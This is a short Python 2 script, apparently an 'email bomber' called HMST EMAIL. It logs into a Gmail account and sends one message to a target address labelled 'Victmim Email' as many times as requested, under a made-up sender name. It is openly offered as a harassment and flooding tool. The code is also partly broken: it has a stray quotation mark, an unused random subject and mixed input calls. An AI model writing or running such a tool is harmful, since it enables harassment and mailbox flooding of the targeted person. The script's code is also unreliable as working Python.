

import os
import smtplib
import getpass
import sys
import time

os.system ("clear")
os.system("figlet HMST EMAIL")
print
print ("Hamster")
time.sleep(2)
print ("☠️")
time.sleep(2)
print ("Instagram : @hamster.py")
time.sleep(2)
print ("With great power comes great responsibility.")      
                                    
email = raw_input('Your Gmail Address : ')
time.sleep(2)         '
user = raw_input('Anonymous name : ')
time.sleep(2)
passwd = getpass.getpass('Password: ')

to = input('\nVictmim Email: ')
body = raw_input('Message: ')
total = input('Number of send: ')

smtp_server = 'smtp.gmail.com'
port = 587

try:
    server = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    server.starttls()
    server.login(email,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
        server.sendmail(email,to,msg)
        print "\rE-mails sent: %i" % i
        time.sleep(1)
        sys.stdout.flush()
    server.quit()
    print '\n Done !!!'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] The username or password you entered is incorrect.'
    sys.exit()
